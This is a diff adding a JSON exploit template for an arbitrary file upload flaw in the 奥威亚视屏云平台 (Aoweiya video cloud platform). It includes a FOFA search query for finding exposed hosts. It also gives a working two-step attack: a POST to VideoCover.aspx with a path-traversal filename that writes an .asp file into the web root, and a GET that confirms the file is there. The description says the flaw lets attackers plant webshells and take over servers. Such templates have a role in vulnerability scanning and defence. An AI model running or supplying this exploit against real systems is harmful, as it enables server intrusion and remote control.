@@ -1,0 +1,58 @@
+{
+  "product": "奥威亚视屏云平台",
+  "vul_name": "奥威亚视屏云平台 VideoCover任意文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "奥威亚视屏云平台接口VideoCover.aspx存在任意文件上传，通过此漏洞攻击者可上传webshell木马，远程控制服务器。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"/CSS/NewtonTheme/assets/app.css\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_56698744/article/details/134998173",
+  "fix": [],
+  "exploit": [
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/Tools/Video/VideoCover.aspx",
+        "file": {
+          "file": [
+            "/../../../AVA.ResourcesPlatform.WebUI/52e039302a62d077.asp",
+            "95cc64dd2825f9df13ec4ad683ecf339",
+            "image/jpeg"
+          ]
+        }
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "body": "Success"
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/52e039302a62d077.asp"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "body": "95cc64dd2825f9df13ec4ad683ecf339"
+          }
+        ]
+      }
+    }
+  ]
+}
